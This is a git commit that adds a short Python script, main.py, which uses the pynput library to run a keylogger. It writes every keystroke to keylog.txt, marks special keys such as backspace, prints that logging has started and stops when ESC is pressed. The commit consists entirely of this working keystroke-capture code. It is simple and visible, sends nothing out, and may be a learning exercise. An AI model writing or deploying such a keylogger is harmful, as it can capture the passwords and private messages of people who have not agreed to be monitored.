3bbbe8abf556102ccacf6146c5e98a7732de95c7
matteoiyan <garyypoter96@gmail.com>
2025-10-22 15:38:04 -0500

    Subiendo documento inicial

---
+++ main.py
@@ -0,0 +1,31 @@
+from pynput import keyboard
+
+def on_press(key):
+    try:
+        # Teclas normales (a-z, 0-9)
+        with open("keylog.txt", "a") as f:
+            f.write(key.char)
+    except AttributeError:
+        # Teclas especiales
+        with open("keylog.txt", "a") as f:
+            if key == keyboard.Key.space:
+                f.write(" ")
+            elif key == keyboard.Key.enter:
+                f.write("\n")
+            elif key == keyboard.Key.backspace:
+                f.write("[BACKSPACE]")
+            else:
+                f.write(f"[{key}]")
+    
+    # Detener con ESC
+    if key == keyboard.Key.esc:
+        return False
+
+print("Keylogger simple iniciado")
+print("Presiona ESC para detener")
+
+# Iniciar el listener
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+
+print("Keylogger detenido")
